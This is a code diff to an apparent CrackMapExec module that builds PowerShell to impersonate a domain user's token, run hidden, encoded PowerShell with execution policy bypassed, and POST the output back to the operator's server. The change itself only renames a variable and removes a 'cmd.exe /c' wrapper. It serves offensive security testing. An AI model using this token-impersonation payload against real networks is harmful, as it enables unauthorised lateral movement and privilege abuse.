@@ -103,12 +103,12 @@ class CMEModule:
                 $post_back = $post_back + $token_desc;
                 Send-POSTRequest $post_back
 
-                Invoke-TokenManipulation -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {command}";
+                Invoke-TokenManipulation -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {second_stage}";
                 return
             }}
         }}
 
-        Send-POSTRequest "User token not present on system!"'''.format(command=b64encode(second_stage.encode('UTF-16LE')),
+        Send-POSTRequest "User token not present on system!"'''.format(second_stage=b64encode(second_stage.encode('UTF-16LE')),
                                                                        server=context.server,
                                                                        addr=context.localip,
                                                                        port=context.server_port,
@@ -118,9 +118,6 @@ class CMEModule:
         return create_ps_command(launcher)
 
     def payload(self, context, command):
-        command_to_execute  = 'cmd.exe /c {}'.format(command)
-        #context.log.debug(command_to_execute)
-
         #This will get executed in the process that was created with the impersonated token
         payload = '''
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
@@ -154,7 +151,7 @@ class CMEModule:
                                                 addr=context.localip, 
                                                 port=context.server_port,
                                                 targets=self.target_computers,
-                                                command=command_to_execute)
+                                                command=command)
 
         return payload
 
